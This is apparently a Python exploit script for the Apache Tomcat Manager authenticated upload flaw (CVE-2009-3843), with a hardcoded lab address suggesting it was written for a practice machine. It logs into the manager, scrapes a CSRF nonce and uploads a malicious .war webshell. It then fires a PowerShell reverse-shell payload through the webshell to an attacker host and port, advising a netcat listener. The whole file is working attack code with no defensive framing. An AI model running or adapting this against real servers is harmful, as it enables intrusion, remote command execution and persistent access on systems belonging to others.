# -*- coding:utf-8 -*-

# Apache Tomcat Manager Authenticated Upload Code Execution
# CVE: 2009-3843
# Exploit author: unknown
# Python script exploit author: nullarmor <nullarmor@protonmail.com>

import argparse
import base64
import random
import requests
import string
import sys
from time import sleep

def main():

	# args
    argparser = argparse.ArgumentParser(description='Apache Tomcat Manager Authenticated Upload Code Execution', 
                                        add_help=False)
    main_arg = argparser.add_argument_group("MAIN")
    
    main_arg.add_argument('-h', '--help', 
                            help='Show this help menu', 
                            action='store_true')
    
    main_arg.add_argument('--rhost', type=str,
                            help='Tomcat Manager host', 
                            required=True)
    
    main_arg.add_argument('--lhost', type=str,
                            help='Local host to receive reverse shell', 
                            required=True)
    
    main_arg.add_argument('--lport', type=str,
                            help='Local port to receive reverse shell (default: 4444)', 
                            default='4444')
                                                    
    main_arg.add_argument('--login', type=str,
                            help='Tomcat Manager login', 
                            required=True)
    
    main_arg.add_argument('--password', type=str,
                            help='Tomcat manager password', 
                            required=True)
    
    main_arg.add_argument('--burpsuite', action='store_true',
                            help='Enable burpsuite proxy')
    
    args = argparser.parse_args()
    
    # arg validation
    if args.help:
        argparser.print_help()
        sys.exit(1)
    
    # cons
    lhost = args.lhost
    lport = args.lport
    rhost = args.rhost
    tomcat_login = args.login
    tomcat_password = args.password
    url_login = "{}/manager/html".format(rhost)
    url_upload = "{}/manager/html/upload?org.apache.catalina.filters.CSRF_NONCE=".format(rhost)
    burpsuite = args.burpsuite
    
    # req session
    sess = requests.Session()
    
    def string_generator():
        letters = string.ascii_letters
        return ''.join(random.choice(letters) for i in range(8))
        
    def login():
        
        print(" [*] Sign-in using credentials...")
        
        basic_raw = "{}:{}".format(tomcat_login, tomcat_password)
        basic_encoded = base64.b64encode(basic_raw.encode()).decode("utf-8")
        headers = {"Authorization": "Basic {}".format(basic_encoded)}
        
        try:
            r = sess.get(url_login, headers=headers)
        except Exception as e:
            print(e)
        else:
            if '/manager/html/deploy' in r.content.decode('utf-8'):
                print(" [*] Logged with success!")
                csrf = r.content.decode('utf-8').split('.CSRF_NONCE=')[1].split('">List Applications')[0]
                return True, csrf
            else:
                print(" [*] Login failed, check your credencials!")
                sys.exit(1)
            
    def exploit(csrf):   
        print(" [*] Uploading the malicious .war file...")
        
        path_exploit = string_generator()
        basic_raw = "{}:{}".format(tomcat_login, tomcat_password)
        basic_encoded = base64.b64encode(basic_raw.encode()).decode("utf-8")
        headers = {
            "Authorization": "Basic {}".format(basic_encoded),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Referer": "http://10.10.10.95:8080/manager/html"
        }
        files = {
            "deployWar":( "{}.war".format(path_exploit), 
                      open( "jerry_cmd.war" ,"rb"), 
                      "application/octet-stream")
        }
        
        proxies = {
            "http": "127.0.0.1:8080"
        }
        
        try:
            if burpsuite:
                r = sess.post("{}{}".format(url_upload, csrf), files=files, headers=headers, proxies=proxies)
            else:
                r = sess.post("{}{}".format(url_upload, csrf), files=files, headers=headers)
                
        except Exception as e:
            print(e)
        else:
            if "OK" in r.content.decode('utf-8'):
                print(" [*] JSP Webshell uploaded with success!")
                return True, path_exploit
            else:
                print(" [*] JSP Webshell upload failed!")

    
    def reverse_shell(path_exploit):
        
        print(" [*] Setting up reverse shell using LHOST {} and LPORT {} ...".format(lhost, lport))
        
        url_revshell = "{}/{}/cmd.jsp?cmd=".format(rhost, path_exploit)
        payload_powershell = """powershell -nop -exec bypass -c "$client = New-Object System.Net.Sockets.TCPClient('"""+lhost+"""',"""+lport+""");$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()" """
        payload_powershell = requests.utils.quote(payload_powershell)
        
        print(" [*] In 10 seconds a connection will be received, run on a new terminal: nc -lvp {} and wait :)".format(lport))
        sleep(10)
        print(" [*] Reverse shell connection spawned!")
        
        try:
            r = sess.get(url_revshell + payload_powershell)
        except:
            print(" [*] Failed to upload web shell :(")
            
    # main
    print(" [>] Apache Tomcat Manager Authenticated Upload Code Execution")
    print(" [*] Python script exploit author: nullarmor")
    
    login_info = login()
    
    if login_info[0]:
        exploit_info = exploit(login_info[1])
        
        if exploit_info[0]:
            reverse_shell(exploit_info[1])
        
    
if __name__ == "__main__":
    main()
